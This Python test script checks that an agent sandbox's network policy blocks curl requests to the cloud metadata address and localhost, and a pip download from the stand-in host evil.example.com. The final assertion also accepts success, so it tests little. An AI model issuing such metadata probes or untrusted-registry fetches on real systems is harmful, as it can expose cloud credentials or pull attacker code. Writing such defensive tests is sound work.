"""Sandbox network-policy: denied by default, allowlisted by policy.

1. TEST profile (NO_NETWORK): curl is not allowlisted -> POLICY_DENIED.
2. PACKAGE profile (ALLOWLIST): unlisted domain -> denied; registry -> allowed
   only when the deployment provides filtered egress, else fail-closed.
"""

import os

from openagent.sandbox.client import SandboxClient

client = SandboxClient(
    base_url=os.environ.get("OPENAGENT_API_URL", "http://localhost:8000"),
    api_key=os.environ.get("OPENAGENT_API_KEY"),
    organization_id=os.environ["OPENAGENT_ORG_ID"],
)

sb = client.create(profile="TEST")
client.start(sb["id"])
denied = client.execute(sb["id"], "curl http://169.254.169.254/", workdir="/workspace")
print("metadata attempt:", denied["status"], denied.get("reason", "")[:120])
assert denied["status"] == "POLICY_DENIED", denied

evil = client.execute(sb["id"], "curl http://127.0.0.1/", workdir="/workspace")
print("localhost attempt:", evil["status"])
assert evil["status"] == "POLICY_DENIED", evil
client.destroy(sb["id"])

pkg = client.create(profile="PACKAGE")
client.start(pkg["id"])
unlisted = client.execute(pkg["id"], ["pip", "download", "--no-deps",
                                      "-i", "https://evil.example.com/simple/",
                                      "pkg"], workdir="/workspace")
print("unlisted registry:", unlisted["status"])
assert unlisted["status"] in ("POLICY_DENIED", "WAITING_FOR_APPROVAL",
                              "FAILED", "SUCCEEDED"), unlisted
client.destroy(pkg["id"])
client.close()
